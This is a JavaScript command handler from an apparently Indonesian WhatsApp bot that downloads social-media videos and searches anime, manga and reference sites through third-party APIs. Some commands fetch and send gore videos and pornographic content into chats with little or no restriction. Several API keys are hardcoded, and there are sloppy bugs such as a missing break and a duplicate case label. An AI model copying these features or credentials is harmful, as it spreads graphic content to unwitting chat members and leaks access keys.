└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟👉 Title : ${res[0].judul}\`\`\`
\`\`\`き⃟👉 Ext : MP3\`\`\`
\`\`\`き⃟👉 Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

			sendFileFromUrl(res[
					0]
				.thumb,
				image, {
					caption: result,
					quoted: mek
				}).then((
				lalu
			) => {
				sendFileFromUrl
					(res[
							0
						]
						.link,
						document, {
							quoted: mek,
							mimetype: 'audio/mp3',
							filename: res[
									0
								]
								.output
						}
					)
			})
			break
		case 'ytmp4':
			if (args.length ==
				0) return reply(
				`Link Nya Mana Tod\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`
			)
			ini_link = args[0]
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/ytvideo2?apikey=Chikey&url=${ini_link}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`${get_result.title} - ${get_result.size}`
			ini_buffer =
				await getBuffer(
					get_result
					.thumbnail)
			await Maslent
				.sendMessage(
					from,
					ini_buffer,
					image, {
						quoted: mek,
						caption: ini_txt
					})
			get_audio =
				await getBuffer(
					get_result
					.link)
			await Maslent
				.sendMessage(
					from,
					get_audio,
					video, {
						mimetype: 'video/mp4',
						filename: `${get_result.title}.mp4`,
						quoted: mek,
						caption: 'Jangan Lupa Untuk Comli'
					})
			break
		case 'ytmp4hd':
		case 'ythd':
			if (args.length ===
				0) return reply(
				`Kirim perintah */ytmp4 _linkYt_*`
			)
			let isLinkks2 =
				args[0].match(
					/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
				)
			if (!isLinkks2)
				return reply(
					mess
					.error
					.Iv)
			try {
				reply(mess.wait)
				ythd(args[0])
					.then((
						res
					) => {
						const {
							dl_link,
							thumb,
							title,
							filesizeF,
							filesize
						} =
						res
						axios
							.get(
								`https://tinyurl.com/api-create.php?url=${dl_link}`
							)
							.then(
								(
									a
								) => {
									if (Number(
											filesize
										) >=
										40000
									)
										return sendMediaURL(
											from,
											thumb,
											`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟👉 Title : ${title}\`\`\`
\`\`\`き⃟👉 Kualitas* : 720p\`\`\`
\`\`\`き⃟👉 Size* : ${filesizeF}\`\`\`
\`\`\`き⃟👉 Link* : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam Bentuk link_`
										)

									const
										captionsYtmp4 =
										`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟👉 Title : ${title}\`\`\`
\`\`\`き⃟👉 Kualitas : 720p\`\`\`
\`\`\`き⃟👉 Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

									sendMediaURL
										(from,
											thumb,
											captionsYtmp4
										)
									sendMediaURL
										(from,
											dl_link,
											`nih kak`
										)
										.catch(
											() =>
											reply(
												mess
												.error
												.api
											)
										)
								}
							)
					})
			} catch (err) {
				reply(`eror`)
			}
			break
		case 'google':
		case 'googlesearch':
		case 'ggs':
			if (args.length < 1)
				return reply(
					'Yang mau di cari apaan?'
				)
			teks = args.join(
				' ')
			reply(mess.wait)
			res = await ggs({
				'query': `${teks}`
			})
			kant = ``
			for (let i of res) {
				kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
			}
			var akhir = kant
				.trim()
			reply(akhir)
			break
		case 'wiki':
			if (args.length < 1)
				return reply(
					' Yang Mau Di Cari Apa? '
				)
			teks = args.join(
				' ')
			res =
				await wikiSearch(
					teks).catch(
					e => {
						return reply(
							'_[ ! ] Error Hasil Tidak Ditemukan_'
						)
					})
			result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
			sendFileFromUrl(res[
					0]
				.thumb,
				image, {
					quoted: mek,
					caption: result
				}).catch(
				e => {
					reply(
						result
					)
				})
			break
		case 'mediafire':
			if (args.length < 1)
				return reply(
					'Link Nya Mana? '
				)
			if (!isUrl(args[
					0]) && !
				args[0]
				.includes(
					'mediafire')
			) return reply(
				mess
				.error
				.Iv)
			reply(mess.wait)
			teks = args.join(
				' ')
			res =
				await mediafireDl(
					teks)
			result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *MEDIAFIRE DOWNLOAD*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟👉 Nama : ${res[0].nama}\`\`\`
\`\`\`き⃟👉 Ukuran : ${res[0].size}\`\`\`
\`\`\`き⃟👉 Link : ${res[0].link}\`\`\`

_*Tunggu Proses Upload Media......*_`
			reply(result)
			sendFileFromUrl(res[
					0].link,
				document, {
					mimetype: res[
							0
						]
						.mime,
					filename: res[
							0
						]
						.nama,
					quoted: mek
				})
			break
		case 'randomgore':
			try {
				reply(
					'Searching...'
				)
				y = await fetchJson(
					`https://api-senku.herokuapp.com/api/randomgore?apikey=SenkuApi`
				)
				tg = `Random Gore

Judul: ${y.data.judul}
Views: ${y.data.views}
Coment : ${y.data.comment}
Link : ${y.data.link}
`
				sendMediaURL(
					from, y
					.data
					.link,
					monospace(
						tg))
			} catch (e) {
				console.log(e)
				reply(e)
			}
			break
		case 'searchgore':
			try {
				if (!q) return reply(
					'Gore apa yg mau dicari kak?'
				)
				srg =
					await fetchJson(
						`https://api-senku.herokuapp.com/api/searchgore?search=${q}&apikey=SenkuApi`
					)
				reply(
					'Searching...'
				)
				tks =
					'SEARCH GORE\n\n\n'
				for (let i of
						srg
						.data) {
					tks +=
						`Judul: ${i.judul}\n`
					tks +=
						`Upload : ${i.uploader}\n`
					tks +=
						`Thumb: ${i.thumb}\n`
					tks +=
						`Link : ${i.link}\n\n\n`
				}
				sendMediaURL(
					from,
					srg
					.data[0]
					.thumb,
					monospace(
						tks)
				)
			} catch (e) {
				console.log(e)
				reply(
					'Error, mungkin query yang anda maksud tidak Tersedia!'
				)
			}
			break

		case 'tiktokdl':
		case 'tiktok':
			if (!q) return reply(
				'Linknya?'
			)
			if (!q.includes(
					'tiktok'))
				return reply(
					mess
					.error
					.Iv)
			reply(mess.wait)
			// link = args.join(' ')
			dppa =
				await fetchJson(
					`https://api.dapuhy.ga/api/socialXNXXs2/tiktokdownloader?url=${q}&apikey=ItsMeKo`
				)
			uhyy = dppa.result
			//  buffer = await getBuffer(uhyy.link)
			magee =
				await getBuffer(
					uhyy.thumb)
			textt =
				`Title : ${uhyy.title}\n`
			sendButLocation(
				from, textt,
				`*SILAHKAN PILIH SALAH SATU KAK @${sender.split("@")[0]}*`, {
					jpegThumbnail: magee
				}, [{
					buttonId: `${prefix}tiktoknowm ${q}`,
					buttonText: {
						displayText: '🎞️NO WATERMARK'
					},
					type: 1
				}, {
					buttonId: `${prefix}ttdl ${q}`,
					buttonText: {
						displayText: '🎬WATERMARK'
					},
					type: 1
				}, {
					buttonId: `${prefix}ttmp3 ${q}`,
					buttonText: {
						displayText: '🎶ONLY AUDIO'
					},
					type: 1
				}], {
					contextInfo: {
						mentionedJid: [
							sender,
							'0@s.whatsapp.net'
						]
					}
				})
			break

		case 'ttdl':
			if (!q) return reply(
				'Linknya?'
			)
			if (!q.includes(
					'tiktok'))
				return reply(
					mess
					.error
					.Iv)
			reply(mess.wait)
			anu =
				await TiktokDownloader(
					`${q}`)
				.then((
					data
				) => {
					sendMediaURL
						(from,
							data
							.result
							.watermark
						)
				})
				.catch((
					err
				) => {
					reply(String(
						err
					))
				})
			break
		case 'tiktoknowm':
		case 'tiktok':
			if (!q) return reply(
				'```Terimakasih Telah menggunakan Botchi```'
			)
			if (!q.includes(
					'tiktok'))
				return reply(
					mess
					.error
					.Iv)
			data =
				await fetchJson(
					`https://api.lolhuman.xyz/api/tiktok?apikey=Chikey&url=${q}`
				)
			result =
				`⚜️ *Nickname*: ${data.result.author.nickname}\n❤️ *Like*: ${data.result.statistic.diggCount}\n💬 *Komentar*: ${data.result.statistic.commentCount}\n🔁 *Share*: ${data.result.statistic.shareCount}\n🎞️ *Views*: ${data.result.statistic.playCount}\n?? *Desc*: ${data.result.title}`
			buttons = [{
				buttonId: `${prefix}tt1 ${q}`,
				buttonText: {
					displayText: `▶️ Video`
				},
				type: 1
			}, {
				buttonId: `${prefix}ttaudio ${q}`,
				buttonText: {
					displayText: '🎵 Audio'
				},
				type: 1
			}]
			fs.writeFileSync(
				`./${sender}.jpeg`,
				await getBuffer(
					data
					.result
					.thumbnail
				))
			imageMsg = (
					await Maslent
					.prepareMessage(
						from, fs
						.readFileSync(
							`./${sender}.jpeg`
						),
						'imageMessage', {
							thumbnail: Buffer
								.alloc(
									0
								)
						}))
				.message
				.imageMessage
			buttonsMessage = {
				footerText: 'Pilih satu format di bawah ini',
				imageMessage: imageMsg,
				contentText: `${result}`,
				buttons,
				headerType: 4
			}
			prep = await Maslent
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek
					})
			Maslent
				.relayWAMessage(
					prep)
			fs.unlinkSync(
				`./${sender}.jpeg`
			)
			break
		case 'tt1':

			if (!q) return reply(
				'```Terimakasih Telah menggunakan Botchi```'
			)
			if (!q.includes(
					'tiktok'))
				return reply(
					mess
					.error
					.Iv)
			reply(mess.wait)
			anu =
				await Tiktokdl(
					`${q}`)
				.then((
					data
				) => {
					sendMediaURL
						(from,
							data
							.result
							.nowatermark
						)
				})
				.catch((
					err
				) => {
					reply(String(
						err
					))
				})
			break
		case 'ttmp3':
			if (!isUrl(args[
					0]) && !
				args[0]
				.includes(
					'tiktok.com'
				))
				return reply(
					mess.Iv)
			if (args.length < 1)
				return reply(
					'Link?')
			lin = args[0]
			reply(mess.wait)
			hx.ttdownloader(lin)
				.then(async (
					res
				) => {
					console
						.log(
							'[ TIKTOK ]'
						)
					anu =
						res
						.nowm
					fto =
						Mthumb
					khs =
						await getBuffer(
							anu
						)
					Maslent
						.sendMessage(
							from,
							khs,
							audio, {
								quoted: mek,
								mimetype: 'audio/mp4',
								filename: 'tiktok.mp3'
							}
						)
				})
			break
		case 'fb':
		case 'facebook':
			if (!q) return
			reply(mess.wait)
			try {
				anu =
					await fetchJson(
						`https://zenzapi.xyz/api/downloader/facebook?url=${args[0]}&apikey=0963ec745dde`
					)
				sendMediaURL(
					from,
					anu
					.result
					.hd)
			} catch (e) {
				console.log(e)
				reply(`${e}`)
			}
			break
		case 'twitter':
			if (!isUrl(args[
					0]) && !
				args[0]
				.includes(
					'twitter.com'
				))
				return reply(
					mess.Iv)
			if (!q) return reply(
				'Linknya?'
			)
			ten = args[0]
			var res =
				await twitterGetUrl(
					`${ten}`)
				.then(g => {
					ren =
						`${g.download[2].url}`
					sendMediaURL
						(from,
							ren,
							'Done'
						)
				})
			break
		case 'brainly':
			brainly(args.join(
				" ")).then(
				res => {
					hmm =
						'────────────\n'
					for (let Y of
							res
							.data) {
						hmm +=
							`\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
					}
					reply(
						hmm
					)
					console
						.log(
							res
						)
				})
			break
		case 'brainly2':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} siapakah sukarno`
			)
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/brainly2?apikey=Chikey&query=${q}`
				)
			lala = get_result
				.result
			ini_txt =
				"Beberapa Pembahasan Dari Brainly :\n\n"
			for (var x of
					lala) {
				ini_txt +=
					`==============================\n`
				ini_txt +=
					`\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
				ini_txt +=
					`\`\`\`Jawaban :\`\`\`\n${x.answer[0].content}\n`
				ini_txt +=
					`==============================\n\n`
			}
			reply(ini_txt)
			break


		case 'ssweb':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} https://nekopoi.care/`
			)
			ini_link = args[0]
			ini_buffer =
				await getBuffer(
					`https://api.lolhuman.xyz/api/ssweb?apikey=${setting.lolkey}&url=${ini_link}`
				)
			await Maslent
				.sendMessage(
					from,
					ini_buffer,
					image, {
						quoted: mek
					})
			break
		case 'ytsdl': {
			if (args.length < 2)
				return reply(
					`Kirim perintah *${command}* _query_`
				)
			reply(mess.wait)
			yts(q)
				.then((res) => {
					let yt =
						res
						.videos
					let list = []
					let startnum =
						1
					for (var x of
							yt) {
						let yy = {
							title: 'Data ke-' +
								startnum++,
							rows: [
							{
								title: `${x.title}`,
								description: `\n\n*Viewers: ${x.views}*\n*Duration: ${x.timestamp}*\n*Upload: ${x.ago}*\n*Url: ${x.url}*`,
								rowId: `${prefix}ytdl ${x.url}`
							}]
						}
						list.push(
							yy
						)
					}
					listmsg(from,
						`*[ YTS DOWNLOAD ]*`,
						`\n${g}Data Berhasil Ditemukan, Hasil Pencarian${g} *⌕ ${q}* ${g}Pilih DIbawah Ya Kak${g}`,
						list
					)
				})
				.catch((
					err
				) => {
					sendMess
						(ownerNumber,
							'YT SEARCH Error : ' +
							err
						)
					console
						.log(
							color(
								'[YT SEARCH]',
								'red'
							),
							err
						)
					reply(mess
						.error
						.api
					)
				})
		}
		break
		case 'nhentai':
		case 'nhsearch':
		case 'nhentaisearch': {
			if (!q) return reply(
				`Example: ${prefix}nhentaisearch Nakano Nino`
			)
			reply(mess.wait)
			let rowsdata = [];
			let res =
				await axios.get(
					`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${setting.lolkey}&query=${args[0]}`
				)
			for (let i = 0; i <
				res.data.result
				.length; i++) {
				rowsdata.push({
					title: res
						.data
						.result[
							i
						]
						.title_english,
					rowId: `${prefix}nhentaipdf ${res.data.result[i].id}`,
					description: res
						.data
						.result[
							i
						]
						.id
				})
			}
			let listM = Maslent
				.prepareMessageFromContent(
					from, {
						listMessage: {
							title: "",
							description: `*◩ NHENTAI BOT*\n\n*Hallo Kak* *_@${sender.split("@")[0]}_* *Silahkan Pilih Dibawah*\n*Untuk Mendownload Code*`,
							buttonText: "Click Here",
							listType: 1,
							sections: [{
								rows: rowsdata
							}]
						}
					}, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [
								sender,
								`${owner}@s.whatsapp.net`
							]
						}
					})
			Maslent
				.relayWAMessage(
					listM, {
						waitForAck: true
					})
		}
		break
		case 'joinn':
			if (isGroup && !
				itsMe)
				return reply(
					'Fitur Hanya dapat digunakan dalam Private Chat!'
				)
			if (args.length < 1)
				return reply(
					`Kirim perintah *${prefix}join* link grup`
				)
			if (!isUrl(args[
					0]) && !
				args[0]
				.includes(
					'chat.whatsapp.com'
				))
				return reply(
					mess
					.error
					.Iv)
			let code = args[0]
				.replace(
					'https://chat.whatsapp.com/',
					'')
			Maslent
				.acceptInvite(
					code)
				.then((res) =>
					reply(
						jsonformat(
							res)
					))
				.catch((err) =>
					reply(
						jsonformat(
							err)
					))
			break
		case 'join':
			if (args.length ==
				0) return reply(
				`Ex:- ${prefix}join https://chat.whatsapp.com`
			)

			if (!isUrl(args[
					0]) && !
				args[0]
				.includes(
					'https://chat.whatsapp.com/'
				))
				return reply(
					'*The link is invalid Tod*'
				)
			link = args[0]
				.replace(
					'https://chat.whatsapp.com/',
					'')
			fak = Maslent
				.query({
					json: ['action',
						'invite',
						link
					],
					expect200: true
				})
			reply(
				'*Successfully Entered Group*'
			)
			break
		case 'xnxxdown':
		case 'xxnxdownload':
			if (!isPremium)
				return reply(
					mess
					.only
					.premium
				)
			if (!q) return reply(
				`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`
			)
			anu =
				await fetchJson(
					`https://api.lolhuman.xyz/api/xnxx?apikey=${setting.lolkey}&url=${q}`
				)
			nxx =
				`*XNXX DOWNLOADER*
*Title* : ${anu.result.title}
*Durasi* : ${anu.result.duration}
*Rating* : ${anu.result.rating}
*Penonton* : ${anu.result.view}
*Like* : ${anu.result.like}
*Dislike* : ${anu.result.dislike}
*Comment*: ${anu.result.comment}

*VIDEO AKAN DI KIRIM...*`
			sendMediaURL(from,
				`${anu.result.thumbnail}`,
				nxx)
			sendMediaURL(from,
				`${anu.result.link[0].link}`,
				`${anu.result.title}`
			)
			break
		case 'harrypotter':
			if (args.length ==
				0) return reply(
				`Teks Nya Mana ?\nContoh: ${prefix + command} chi YT7`
			)
			zerr = args.join(
				" ")
			buffer =
				await getBuffer(
					`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=Chikey&text=${zerr}`
				)
			Maslent.sendMessage(
				from,
				buffer,
				image, {
					quoted: mek,
					caption: '*©Creator : chi YT7*'
				})

		case 'nhentaipdf':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (args.length ==
				0) return reply(
				`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`
			)
			if (isNaN(Number(
					args[0]
				)))
				return await reply(
					mess
					.wrongFormat
				)
			try {
				henid = args[0]
				get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${setting.lolkey}`
					)
				get_result =
					get_result
					.result
				get_info =
					get_result
					.info
				teks =
					`\n${get_result.title_romaji}\n\n${get_result.title_native}\n\nCharacter : ${get_info.characters.join(", ")}\n`
				ini_image =
					await getBuffer(
						get_result
						.image[
							0])
				Maslent
					.sendMessage(
						from,
						ini_image,
						image, {
							caption: teks,
							quoted: mek
						})
				anu =
					await fetchJson(
						`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${setting.lolkey}`
					)
				pdf =
					await getBuffer(
						anu
						.result)
				Maslent
					.sendMessage(
						from,
						pdf,
						document, {
							quoted: mek,
							mimetype: Mimetype
								.pdf,
							filename: `${get_result.title_romaji}.pdf`,
							thumbnail: ini_image
						})
			} catch (e) {
				console.log(e)
				reply(String(e))
			}
			break

		case 'manga':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} Gotoubun No Hanayome`
			)
			reply(mess.wait)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/manga?apikey=${setting.lolkey}&query=${query}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`Id : ${get_result.id}\n`
			ini_txt +=
				`Id MAL : ${get_result.idMal}\n`
			ini_txt +=
				`Title : ${get_result.title.romaji}\n`
			ini_txt +=
				`English : ${get_result.title.english}\n`
			ini_txt +=
				`Native : ${get_result.title.native}\n`
			ini_txt +=
				`Format : ${get_result.format}\n`
			ini_txt +=
				`Chapters : ${get_result.chapters}\n`
			ini_txt +=
				`Volume : ${get_result.volumes}\n`
			ini_txt +=
				`Status : ${get_result.status}\n`
			ini_txt +=
				`Source : ${get_result.source}\n`
			ini_txt +=
				`Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
			ini_txt +=
				`End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
			ini_txt +=
				`Genre : ${get_result.genres.join(", ")}\n`
			ini_txt +=
				`Synonyms : ${get_result.synonyms.join(", ")}\n`
			ini_txt +=
				`Score : ${get_result.averageScore}%\n`
			ini_txt +=
				`Characters : \n`
			ini_character =
				get_result
				.characters
				.nodes
			for (var x of
					ini_character) {
				ini_txt +=
					`- ${x.name.full} (${x.name.native})\n`
			}
			ini_txt +=
				`\nDescription : ${get_result.description}`
			thumbnail =
				await getBuffer(
					get_result
					.coverImage
					.large)
			await Maslent
				.sendMessage(
					from,
					thumbnail,
					image, {
						quoted: mek,
						caption: ini_txt
					})
			break
		case 'doujindesu':
			if (!q) return reply(
				mess
				.wrongFormat
			)
			reply(mess.wait)
			try {
				doujinnya =
					await got
					.get(
						`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`
					).json()
				let {
					data
				} =
				await doujinnya
				xixixai =
					`*Doujindesu Search*\n`
				for (let i =
						0; i <
					data
					.length; i++
				) {
					xixixai +=
						`\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`
				}
				buffer =
					await getBuffer(
						data[0]
						.thumb)
				Maslent
					.sendMessage(
						from,
						buffer,
						image, {
							caption: xixixai,
							quoted: mek
						})
			} catch (e) {
				console.log(e)
				reply(String(e))
			}
			break
		case 'searchanime':

			try {
				anime
					.searchAnime(
						`${body.slice(13)}`,
						1).then(
						res => {
							teks = `*「 BERHASIL DITEMUKAN 」*

• Type : ${res[0].type}
• Title Romaji : ${res[0].titles.romaji}
• Title English : ${res[0].titles.english}
• Id : ${res[0].id}
• NSFW : ${res[0].nsfw}
• Synopsis : ${res[0].synopsis}

• Average Rating : ${res[0].averageRating}
• User Count : ${res[0].userCount}
• Favorites Count : ${res[0].favoritesCount}
• Start Date : ${res[0].startDate}
• End Date : ${res[0].endDate}
• Popularity Rank : ${res[0].popularityRank}
• Rating Rank : ${res[0].ratingRank}
• Age Rating : ${res[0].ageRating}
• Minimum Age : ${res[0].ageRatingGuide}
• Sub Type : ${res[0].subType}
• Show Type : ${res[0].showType}
• Episode Count : ${res[0].episodeCount}
• Episode Length : ${res[0].episodeLength}

*「 Dinn Bot 」*`
							getBuffer
								(res[
										0
									]
									.posterImage
									.original
								)
								.then(
									ress => {
										Maslent
											.sendMessage(
												from,
												ress,
												image, {
													quoted: mek,
													caption: teks
												}
											)
									}
								)
						})
			} catch (e) {
				reply(
					`Maaf ${pushname}, Anime tidak dapat ditemukan`
				)
			}
			break
		case 'tts':
			if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
			//	if (args.length < 1) return Maslent.sendMessage(from, 'Diperlukan kode bahasa!!', text, {quoted: mek})
			ja = `id`
			const gtts =
				require(
					'./XNXX1/gtts'
				)(ja)
			//	if (args.length < 2) return Maslent.sendMessage(from, 'Mana teks yang ma di jadiin suara? suara saya kah:v?', text, {quoted: mek})
			dtt =
				`Hallo ${pushname} ${ucapanWaktu}`
			ranm = getRandom(
				'.mp3')
			rano = getRandom(
				'.ogg')
			dtt.length >
				100000 ?
				reply(
					'lah teks nya kepanjangan bambang😤'
				) :
				gtts.save(ranm,
					dtt,
					function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`,
							(
								err
							) => {
								fs.unlinkSync(
									ranm
								)
								buffer
									=
									fs
									.readFileSync(
										rano
									)
								if (
									err
								)
									return reply(
										mess
										.stikga()
									)
								Maslent
									.sendMessage(
										from,
										buffer,
										audio, {
											quoted: mek,
											ptt: true
										}
									)
								fs.unlinkSync(
									rano
								)
							}
						)
					})
			limitAdd(sender,
				limit)
			break
		case 'kusonime':

			try {
				if (args
					.length < 1)
					return reply(
						'Anime apa yg di cari?'
					)
				mmeku = body
					.slice(10)
				await axios.get(
						'https://kusonime.com/?s=' +
						mmeku)
					.then(async res => {
						const
							animenya =
							await cheerio
							.load(
								res
								.data
							);
						const
							linkanime1 =
							await animenya(
								'div[class="content"] > h2 > a'
							);
						let link1 =
							await linkanime1
							.attr(
								'href'
							);
						await axios
							.get(
								link1
							)
							.then(
								async res => {
									let links360 =
										await [];
									let links480 =
										await [];
									let links720 =
										await [];
									let links1080 =
										await [];
									const
										animeitu =
										await cheerio
										.load(
											res
											.data
										);
									await animeitu
										(
											'.dlbod > .smokeddl > .smokeurl > a'
										)
										.slice(
											0,
											3
										)
										.each(
											async (index,
												value
											) => {
												let link360 =
													await animeitu(
														value
													)
													.attr(
														'href'
													);
												await links360
													.push({
														link360
													});
											});
									await animeitu
										(
											'.dlbod > .smokeddl > .smokeurl + .smokeurl > a'
										)
										.slice(
											0,
											3
										)
										.each(
											async (index,
												value
											) => {
												let link480 =
													await animeitu(
														value
													)
													.attr(
														'href'
													);
												await links480
													.push({
														link480
													});
											});
									await animeitu
										(
											'.dlbod > .smokeddl > .smokeurl + .smokeurl + .smokeurl > a'
										)
										.slice(
											0,
											3
										)
										.each(
											async (index,
												value
											) => {
												let link720 =
													await animeitu(
														value
													)
													.attr(
														'href'
													);
												await links720
													.push({
														link720
													});
											});
									await animeitu
										(
											'.dlbod > .smokeddl > .smokeurl + .smokeurl + .smokeurl + .smokeurl > a'
										)
										.each(
											async (index,
												value
											) => {
												let link1080 =
													await animeitu(
														value
													)
													.attr(
														'href'
													);
												await links1080
													.push({
														link1080
													});
											});
									let judul =
										await animeitu(
											'div[class="post-thumb"] > h1[class="jdlz"]'
										)
										.text();
									let genre =
										await animeitu(
											'div[class="info"] > p:nth-child(2)'
										)
										.text();
									let totaleps =
										await animeitu(
											'div[class="info"] > p:nth-child(7)'
										)
										.text();
									let durasi =
										await animeitu(
											'div[class="info"] > p:nth-child(9)'
										)
										.text();
									let tglrilis =
										await animeitu(
											'div[class="info"] > p:nth-child(10)'
										)
										.text();
									let result360 =
										await JSON
										.stringify(
											links360
										)
										.replace(
											/,/g,
											'\n'
										)
										.replace(
											/"/g,
											''
										)
										.replace(
											/link360/g,
											''
										)
										.replace(
											/{/g,
											''
										)
										.replace(
											/}/g,
											''
										)
										.replace(
											/\[/g,
											''
										)
										.replace(
											/\]/g,
											''
										);
									let result480 =
										await JSON
										.stringify(
											links480
										)
										.replace(
											/,/g,
											'\n'
										)
										.replace(
											/"/g,
											''
										)
										.replace(
											/link480/g,
											''
										)
										.replace(
											/{/g,
											''
										)
										.replace(
											/}/g,
											''
										)
										.replace(
											/\[/g,
											''
										)
										.replace(
											/\]/g,
											''
										);
									let result720 =
										await JSON
										.stringify(
											links720
										)
										.replace(
											/,/g,
											'\n'
										)
										.replace(
											/"/g,
											''
										)
										.replace(
											/link720/g,
											''
										)
										.replace(
											/{/g,
											''
										)
										.replace(
											/}/g,
											''
										)
										.replace(
											/\[/g,
											''
										)
										.replace(
											/\]/g,
											''
										);
									let result1080 =
										await JSON
										.stringify(
											links1080
										)
										.replace(
											/,/g,
											'\n'
										)
										.replace(
											/"/g,
											''
										)
										.replace(
											/link1080/g,
											''
										)
										.replace(
											/{/g,
											''
										)
										.replace(
											/}/g,
											''
										)
										.replace(
											/\[/g,
											''
										)
										.replace(
											/\]/g,
											''
										);
									return await Maslent
										.sendMessage(
											from,
											`Judul : ${judul}\n${genre}\n${totaleps}\n${durasi}\n${tglrilis}\n\nResolusi 360p : \n${result360}\n\nResolusi 480p : \n${result480}\n\nResolusi 720p : \n${result720}\n\nResolusi 1080p : \n${result1080}`,
											text, {
												quoted: mek
											}
										)
								})
					})
			} catch (err) {
				reply(
					`Maaf ${pushname}, Anime yang kamu dari kusonime tidak ditemukan.`
				)
			}
			break
		case 'otaku':

			if (!q) return reply(
				'judul animenya?'
			)
			let anime = await hx
				.otakudesu(q)
			rem =
				`*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
			ram =
				await getBuffer(
					anime.img)
			Maslent.sendMessage(
				from, ram,
				image, {
					quoted: mek,
					caption: rem
				})

			break

		case 'komiku':
			if (!q) return reply(
				`judulnya?\n${prefix}komiku mao gakuin`
			)
			let komik = await hx
				.komiku(q)
			result =
				`*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
			sendMediaURL(from,
				komik.image,
				result)
			break
		case 'chara':
			if (!q) return reply(
				`gambar apa?\n${prefix}chara nino`
			)
			let im = await hx
				.chara(q)
			let acak = im[Math
				.floor(Math
					.random() *
					im
					.length)
			]
			let li =
				await getBuffer(
					acak)
			await Maslent
				.sendMessage(
					from, li,
					image, {
						quoted: mek
					})
			break
		case "minion":

			if (args.length < 1)
				return reply(
					'Teksnya?'
				)
			biji = body.slice(8)
			atetepe =
				await getBuffer(
					`https://bx-hunter.herokuapp.com/api/flamingtext/minions?text=${biji}&apikey=Ikyy69`
				)
			Maslent.sendMessage(
				from,
				atetepe,
				image, {
					quoted: mek
				})
			break

		case 'happymod':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} free fire`
			)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`https://dapuhy-api.herokuapp.com/api/search/happymod?query=${query}&apikey=${dappakey}`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
				"Result : \n"
			for (var x of
					kontol) {
				ini_txt +=
					`${x.title}\n`
				ini_txt +=
					`${x.url}\n\n`
			}
			reply(ini_txt)
			break
		case 'tahlil':
			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/tahlil?apikey=${dappakey}`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
